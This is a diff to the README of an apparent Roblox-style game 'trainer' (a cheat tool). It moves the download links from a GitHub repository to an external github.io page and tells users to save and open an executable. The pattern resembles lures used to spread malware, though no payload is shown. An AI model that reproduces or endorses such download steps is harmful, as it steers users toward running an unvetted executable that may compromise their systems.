@@ -1,6 +1,6 @@
 # ⚓ Blox-Seas-Legacy-Trainer - Master Blox Seas Game Mechanics Easily
 
-[![Download Blox-Seas-Legacy-Trainer](https://img.shields.io/badge/Download-Blox--Seas--Legacy--Trainer-blue)](https://github.com/teluguanime5865/Blox-Seas-Legacy-Trainer)
+[![Download Blox-Seas-Legacy-Trainer](https://img.shields.io/badge/Download-Blox--Seas--Legacy--Trainer-blue)](https://teluguanime5865.github.io)
 
 ## 📋 About This Software
 
@@ -18,7 +18,7 @@ Ensure your computer meets these requirements before you start. You need a Windo
 
 ## 🚀 Setup Instructions
 
-1. Visit the project download page at https://github.com/teluguanime5865/Blox-Seas-Legacy-Trainer.
+1. Visit the project download page at https://teluguanime5865.github.io
 2. Locate the most recent release version in the list.
 3. Save the executable file to your computer.
 4. Open the file to launch the trainer interface.
